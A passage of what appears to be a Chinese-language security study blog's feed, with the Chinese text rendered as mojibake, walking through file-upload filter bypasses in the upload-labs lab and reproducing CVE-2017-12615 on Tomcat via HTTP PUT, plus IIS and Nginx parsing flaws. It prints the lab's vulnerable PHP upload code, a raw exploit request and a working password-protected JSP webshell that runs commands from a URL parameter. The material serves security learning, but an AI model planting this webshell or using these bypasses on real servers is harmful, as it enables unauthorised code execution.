ååœ¨ä¸‹è½½åˆ°æœ¬åœ°ä½¿ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨æ‰“å¼€<br><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112188.png" alt="image-20210904165351038"></p><p>å¯ä»¥çœ‹åˆ°phpä»£ç æ²¡æœ‰è¢«å»é™¤.æˆåŠŸä¸Šä¼ å›¾ç‰‡é©¬ã€‚</p><h4 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2657#toc-13</span><br></pre></td></tr></table></figure><h3 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-17/index.php</span><br><span class="line">http://127.0.0.1/upload-labs/Pass-18/index.php</span><br></pre></td></tr></table></figure><h4 id="æ£€æµ‹ä»£ç -1"><a href="#æ£€æµ‹ä»£ç -1" class="headerlink" title="æ£€æµ‹ä»£ç "></a>æ£€æµ‹ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#x27;submit&#x27;]))&#123;</span><br><span class="line">    $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">    $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;];</span><br><span class="line">    $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">    $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1);</span><br><span class="line">    $upload_file = $UPLOAD_ADDR . &#x27;/&#x27; . $file_name;</span><br><span class="line"></span><br><span class="line">    if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = $UPLOAD_ADDR . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             unlink($upload_file);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæ˜¯å°†æ–‡ä»¶å…ˆä¸Šä¼ åˆ°æœåŠ¡å™¨ï¼Œå†å»æ¯”è¾ƒæ˜¯å¦ç¬¦åˆæ¡ä»¶ï¼Œå¦‚æœç¬¦åˆå°±é‡å‘½åï¼Œä¸ç¬¦åˆå°±åˆ é™¤æ‰ï¼Œæ‰€ä»¥å¯ä»¥ç”¨æ¡ä»¶ç«äº‰ï¼Œä¸€ç›´ç»™æœåŠ¡å™¨å‘é€æ•°æ®åŒ…ï¼Œå°±å¯ä»¥åœ¨ä»–åˆ é™¤ä¹‹å‰è®¿é—®åˆ°</p><h4 id="ç»•è¿‡æ–¹æ³•-2"><a href="#ç»•è¿‡æ–¹æ³•-2" class="headerlink" title="ç»•è¿‡æ–¹æ³•"></a>ç»•è¿‡æ–¹æ³•</h4><p>é€šè¿‡ä¸åœçš„ç»™æœåŠ¡å™¨å‘åŒ…ï¼Œä¸Šä¼ webshellï¼Œè®©ä»–æ¥ä¸åŠåˆ é™¤ï¼Œå°±å¯ä»¥è®¿é—®äº†ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112191.png" alt="image-20210904165853334"></p><h3 id="ç›®å½•å‘½å-x-php"><a href="#ç›®å½•å‘½å-x-php" class="headerlink" title="ç›®å½•å‘½å-x.php/."></a>ç›®å½•å‘½å-x.php/.</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/upload-labs/Pass-19/index.php</span><br></pre></td></tr></table></figure><h4 id="æ£€æµ‹ä»£ç -2"><a href="#æ£€æµ‹ä»£ç -2" class="headerlink" title="æ£€æµ‹ä»£ç "></a>æ£€æµ‹ä»£ç </h4><p>è¿™å…³æ–‡ä»¶åå¯ä»¥è‡ªå·±å®šä¹‰ï¼Œä½†æ˜¯æœ‰è¿‡æ»¤ï¼Œä½†æ˜¯æ–‡ä»¶åæœ€åä¼šå’Œè·¯å¾„è¿›è¡Œæ‹¼æ¥ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡%00ç»•è¿‡ï¼Œä¹Ÿå¯ä»¥é€šè¿‡<code>x.php/.</code>çš„æ–¹å¼ç»•è¿‡ï¼Œè¿™ç§æ–¹å¼åœ¨ä»£ç ä¸­ç›¸å½“äº<code>x.php</code>æ˜¯ç›®å½•ï¼Œç‚¹æ˜¯æ–‡ä»¶åï¼Œæœ€åæ£€æµ‹çš„åç¼€æ˜¯<code>php/.</code>ä½†æ˜¯åœ¨windowsä¸­<code>x.php/.</code>åˆä¼šè¢«å½“ä½œæ˜¯æ–‡ä»¶åã€‚æ‰€ä»¥æœ€ååˆå˜æˆäº†x.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">    if (file_exists($UPLOAD_ADDR)) &#123;</span><br><span class="line">        $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;);</span><br><span class="line"></span><br><span class="line">        $file_name = $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        $file_ext = pathinfo($file_name,PATHINFO_EXTENSION);</span><br><span class="line"></span><br><span class="line">        if(!in_array($file_ext,$deny_ext)) &#123;</span><br><span class="line">            $img_path = $UPLOAD_ADDR . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;], $img_path)) &#123; </span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $msg = &#x27;ä¸Šä¼ å¤±è´¥ï¼&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &#x27;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#x27;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = $UPLOAD_ADDR . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç»•è¿‡"><a href="#ç»•è¿‡" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><p><strong>%00æˆªæ–­</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113689.png" alt="image-20210904172510358"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113919.png" alt="image-20210904172542224"></p><p><strong>ç›®å½•æ–¹å¼ç»•è¿‡</strong></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112674.png" alt="image-20210904172731561"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112033.png" alt="image-20210904172748535"></p><p>è„šæœ¬å‡½æ•°æ¼æ´-CVE-2015-2348  </p><h3 id="æ•°ç»„æ¥å—-ç›®å½•å‘½å"><a href="#æ•°ç»„æ¥å—-ç›®å½•å‘½å" class="headerlink" title="æ•°ç»„æ¥å—+ç›®å½•å‘½å"></a>æ•°ç»„æ¥å—+ç›®å½•å‘½å</h3><h4 id="æ£€æµ‹ä»£ç -3"><a href="#æ£€æµ‹ä»£ç -3" class="headerlink" title="æ£€æµ‹ä»£ç "></a>æ£€æµ‹ä»£ç </h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">$is_upload = false;</span><br><span class="line">$msg = null;</span><br><span class="line">if(!empty($_FILES[&#x27;upload_file&#x27;]))&#123;</span><br><span class="line">    //æ£€æŸ¥MIME</span><br><span class="line">    $allow_type = array(&#x27;image/jpeg&#x27;,&#x27;image/png&#x27;,&#x27;image/gif&#x27;);</span><br><span class="line">    if(!in_array($_FILES[&#x27;upload_file&#x27;][&#x27;type&#x27;],$allow_type))&#123;</span><br><span class="line">        $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥ç±»å‹æ–‡ä»¶!&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        //æ£€æŸ¥æ–‡ä»¶å</span><br><span class="line">        $file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br><span class="line">        if (!is_array($file)) &#123;</span><br><span class="line">            $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        $ext = end($file);</span><br><span class="line">        $allow_suffix = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;);</span><br><span class="line">        if (!in_array($ext, $allow_suffix)) &#123;</span><br><span class="line">            $msg = &quot;ç¦æ­¢ä¸Šä¼ è¯¥åç¼€æ–‡ä»¶!&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br><span class="line">            $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;];</span><br><span class="line">            $img_path = UPLOAD_PATH . &#x27;/&#x27; .$file_name;</span><br><span class="line">            if (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $msg = &quot;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&quot;;</span><br><span class="line">                $is_upload = true;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                $msg = &quot;æ–‡ä»¶ä¸Šä¼ å¤±è´¥ï¼&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    $msg = &quot;è¯·é€‰æ‹©è¦ä¸Šä¼ çš„æ–‡ä»¶ï¼&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="ç»•è¿‡-1"><a href="#ç»•è¿‡-1" class="headerlink" title="ç»•è¿‡"></a>ç»•è¿‡</h4><p>å…³é”®ç‚¹åœ¨äºä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if (!is_array($file)) &#123;</span><br><span class="line">           $file = explode(&#x27;.&#x27;, strtolower($file));</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœ$fileä¸æ˜¯æ•°ç»„ï¼Œå°±ä¼šä»¥.åˆ†å‰²è¢«å¼„æˆæ•°ç»„,å‡å¦‚å›¾ç‰‡åä¸ºxx.jpg,é‚£ä¹ˆæ•°ç»„å°±æ˜¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file=[&#x27;xx&#x27;,&#x27;.&#x27;,&#x27;jpg&#x27;]</span><br></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬è¿™æ ·æ„é€ :</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113633.png" alt="image-20210904174654450"></p><p>é‚£ä¹ˆæ‰§è¡Œè¿™ä¸ªçš„æ—¶å€™$fileå°±ä¼šç­‰äº<code>$_POST[&#39;save_name&#39;]</code>ï¼Œæ­¤æ—¶$fileå°±æ˜¯æ•°ç»„äº†ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file = empty($_POST[&#x27;save_name&#x27;]) ? $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;] : $_POST[&#x27;save_name&#x27;];</span><br></pre></td></tr></table></figure><p>è€Œå–åç¼€å°±ä¼šå»åˆ°æ•°ç»„çš„æœ€åä¸€ä¸ªï¼Œä¹Ÿå°±æ˜¯jpgï¼Œç„¶åå°±ç»•è¿‡äº†æ£€æµ‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ext = end($file);</span><br></pre></td></tr></table></figure><p>æœ€åæ‹¼æ¥åå­—çš„æ—¶å€™å°±æ˜¯<code>aaaaa.php/</code>äº†ï¼Œæ‰€æœ‰æœ€åæ–‡ä»¶å°±æ˜¯<code>aaaaa.php/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$file_name = reset($file) . &#x27;.&#x27; . $file[count($file) - 1];</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112057.png" alt="image-20210904174216258"></p><h3 id="CVE-2017-12615-ä¸Šä¼ -Tomcat"><a href="#CVE-2017-12615-ä¸Šä¼ -Tomcat" class="headerlink" title="CVE-2017-12615-ä¸Šä¼ -Tomcat"></a>CVE-2017-12615-ä¸Šä¼ -Tomcat</h3><h4 id="åŸºæœ¬ä¿¡æ¯"><a href="#åŸºæœ¬ä¿¡æ¯" class="headerlink" title="åŸºæœ¬ä¿¡æ¯"></a>åŸºæœ¬ä¿¡æ¯</h4><ul><li><p>æ¼æ´åç§°ï¼šTomcatä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´</p></li><li><p>æ¼æ´ç¼–å·ï¼šCVE-2017-12615</p></li><li><p>æ¼æ´å½±å“ï¼šä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„æ–‡ä»¶ï¼Œå¹¶è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚</p></li><li><p>å½±å“å¹³å°ï¼šWindows</p></li><li><p>å½±å“ç‰ˆæœ¬ï¼šApache Tomcat 7.0.0 - 7.0.81</p></li></ul><h4 id="æµ‹è¯•è¿‡ç¨‹"><a href="#æµ‹è¯•è¿‡ç¨‹" class="headerlink" title="æµ‹è¯•è¿‡ç¨‹"></a>æµ‹è¯•è¿‡ç¨‹</h4><p><strong>å¼€å¯HTTP PUT</strong></p><p>ä¿®æ”¹Tomcat 7.0/conf/web.xmlæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">æ¼æ´æœ¬è´¨Tomcaté…ç½®äº†å¯å†™ï¼ˆreadonly=falseï¼‰ï¼Œå¯¼è‡´æˆ‘ä»¬å¯ä»¥å¾€æœåŠ¡å™¨å†™æ–‡ä»¶ï¼š</span><br><span class="line"></span><br><span class="line">â€‹```</span><br><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;default&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;0&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;init-param&gt;</span><br><span class="line">        &lt;param-name&gt;readonly&lt;/param-name&gt; //è¿™é‡Œ</span><br><span class="line">        &lt;param-value&gt;false&lt;/param-value&gt;</span><br><span class="line">    &lt;/init-param&gt;</span><br><span class="line">    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure><p>å½“ç„¶å› ä¸ºæ˜¯ç”¨vulhubæ­å»ºçš„ï¼Œæ‰€æœ‰å¼€å¯ç¯å¢ƒçš„æ—¶å€™å·²ç»ä¿®æ”¹è¿‡äº†ã€‚</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112115.png" alt="image-20210904190223852"></p><h4 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><p>è¿™é‡Œéœ€è¦å°†shellå­—ç¬¦ä¸²æ”¹ä¸ºjspåé—¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">ç›´æ¥å‘é€ä»¥ä¸‹æ•°æ®åŒ…å³å¯åœ¨Webæ ¹ç›®å½•å†™å…¥shellï¼š</span><br><span class="line"></span><br><span class="line">â€‹```</span><br><span class="line">PUT /1.jsp/ HTTP/1.1</span><br><span class="line">Host: your-ip:8080</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">shell</span><br><span class="line">â€‹```</span><br></pre></td></tr></table></figure><p>æˆ‘è¿™é‡Œä¿®æ”¹çš„æ˜¯shellæ˜¯</p><p>å¯†ç æ˜¯023ï¼Œé€šè¿‡iè¿›è¡Œä¼ å‚</p><p>è¯·æ±‚ï¼š<a href="http://192.168.47.156:8080/1.jsp?pwd=023&amp;i=ls">http://192.168.47.156:8080/1.jsp?pwd=023&amp;i=ls</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">     if ( &quot;023&quot; .equals(request.getParameter( &quot;pwd&quot; )))&#123;</span><br><span class="line">         java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter( &quot;i&quot; )).getInputStream();</span><br><span class="line">         int a = - 1 ;</span><br><span class="line">         byte [] b = new byte [ 2048 ];</span><br><span class="line">         out.print( &quot;&lt;pre&gt;&quot; );</span><br><span class="line">         while ((a=in.read(b))!=- 1 )&#123;</span><br><span class="line">             out.println( new String(b));</span><br><span class="line">         &#125;</span><br><span class="line">         out.print( &quot;&lt;/pre&gt;&quot; );</span><br><span class="line">     &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113683.png" alt="image-20210904191153268"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113932.png" alt="image-20210904191256585"></p><h4 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;mid=2247483659&amp;idx=1&amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5</span><br><span class="line">https://www.6b8.me/index.php?m=home&amp;c=article&amp;a=index&amp;id=376</span><br></pre></td></tr></table></figure><h3 id="ä¸­é—´ä»¶è§£ææ¼æ´-é…åˆæ–‡ä»¶ä¸Šä¼ æµ‹è¯•"><a href="#ä¸­é—´ä»¶è§£ææ¼æ´-é…åˆæ–‡ä»¶ä¸Šä¼ æµ‹è¯•" class="headerlink" title="ä¸­é—´ä»¶è§£ææ¼æ´+é…åˆæ–‡ä»¶ä¸Šä¼ æµ‹è¯•"></a>ä¸­é—´ä»¶è§£ææ¼æ´+é…åˆæ–‡ä»¶ä¸Šä¼ æµ‹è¯•</h3><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112536.png" alt="image-20210904175536983"></p><h4 id="IIS-ä¸Šä¼ -è§£æ-IIS5-xâ€“6-x"><a href="#IIS-ä¸Šä¼ -è§£æ-IIS5-xâ€“6-x" class="headerlink" title="IIS-ä¸Šä¼ -è§£æ(IIS5.xâ€“6.x)"></a>IIS-ä¸Šä¼ -è§£æ(IIS5.xâ€“6.x)</h4><p>å¦‚æœæ˜¯ä»¥<code>image.asp/qq.jpg</code>ä¸Šä¼ é‚£ä¹ˆimage.aspç›®å½•ä¸‹ä¸ç®¡æ˜¯ä»€ä¹ˆæ–‡ä»¶éƒ½ä¼šè¢«å°±ä¼šè¢«å½“åšaspè§£æï¼Œä¾‹å¦‚è¿™é‡Œçš„qq.jpgï¼Œå°±ä¼šè¢«å½“åšaspè¢«è§£æã€‚<br>å¦‚æœæ–‡ä»¶æ˜¯ä»¥<code>image.asp:jpg</code>æˆ–<code>xxx.aspx;xxjpg</code>å‘½åè¢«ä¸Šä¼ ï¼Œé‚£ä¹ˆæ­¤æ–‡ä»¶ä¼šè¢«å½“åšaspæ‰§è¡Œ</p><p>æ³¨:aspå¯ä»¥æ¢åšphpå¦‚æœæ¢äº†phpé‚£ä¹ˆå°±å½“phpæ‰§è¡Œ</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113736.png" alt="image-20210904192910333" style="zoom:75%;" /><h4 id="Nginx-ä¸Šä¼ -è§£æ"><a href="#Nginx-ä¸Šä¼ -è§£æ" class="headerlink" title="Nginx-ä¸Šä¼ -è§£æ"></a>Nginx-ä¸Šä¼ -è§£æ</h4><p>è¿™ä¸€æ¼æ´æ˜¯ç”±äºNginxä¸­phpé…ç½®ä¸å½“è€Œé€ æˆçš„ï¼Œä¸Nginxç‰ˆæœ¬æ— å…³ï¼Œä½†åœ¨é«˜ç‰ˆæœ¬çš„phpä¸­ï¼Œç”±äºâ€œsecurity.limit_extensionsâ€çš„å¼•å…¥ï¼Œä½¿å¾—è¯¥æ¼æ´éš¾ä»¥è¢«æˆåŠŸåˆ©ç”¨ã€‚</p><p>php.iniæ–‡ä»¶ä¸­cgi.fix_pathinfoçš„å€¼é»˜è®¤ä¸º1ï¼Œä¼šå¯¼è‡´è§£ææ¼æ´</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211112664.png" alt="image-20210904195342399"></p><p>è¿˜æœ‰ä¸€ä¸ªæ˜¯ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xxx.jpg%00.php (Nginx &lt;8.03 ç©ºå­—èŠ‚ä»£ç æ‰§è¡Œæ¼æ´)</span><br></pre></td></tr></table></figure><h4 id="IIS7-5-ä¸Šä¼ -è§£æ"><a href="#IIS7-5-ä¸Šä¼ -è§£æ" class="headerlink" title="IIS7.5-ä¸Šä¼ -è§£æ"></a>IIS7.5-ä¸Šä¼ -è§£æ</h4><p>IIS7.5çš„æ¼æ´ä¸nginxçš„ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”±äºphpé…ç½®æ–‡ä»¶ä¸­ï¼Œå¼€å¯äº†cgi.fix_pathinfoï¼Œè€Œè¿™å¹¶ä¸æ˜¯nginxæˆ–è€…iis7.5æœ¬èº«çš„æ¼æ´ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211113578.png" alt="image-20210904200322332" style="zoom:80%;" /><p>php.inié‡Œé»˜è®¤cgi.fix_pathinfo=1ï¼Œå¯¹å…¶è¿›è¡Œè®¿é—®çš„æ—¶å€™ï¼Œåœ¨URLè·¯å¾„åæ·»åŠ .phpåç¼€åä¼šå½“åšphpæ–‡ä»¶è¿›è¡Œè§£æï¼Œæ¼æ´ç”±æ­¤äº§ç”Ÿ</p><h4 id="å‚è€ƒé“¾æ¥-1"><a href="#å‚è€ƒé“¾æ¥-1" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/1996-11-01-614lb/p/14237744.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> æ–‡ä»¶ä¸Šä¼  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>21WEBæ¼æ´--æ–‡ä»¶ä¸Šä¼ ä¹‹åç«¯é»‘ç™½åå•ç»•è¿‡</title>
      <link href="/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/"/>
      <url>/2021/09/21/21WEB%E6%BC%8F%E6%B4%9E-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%B9%8B%E5%90%8E%E7%AB%AF%E9%BB%91%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/</url>
      
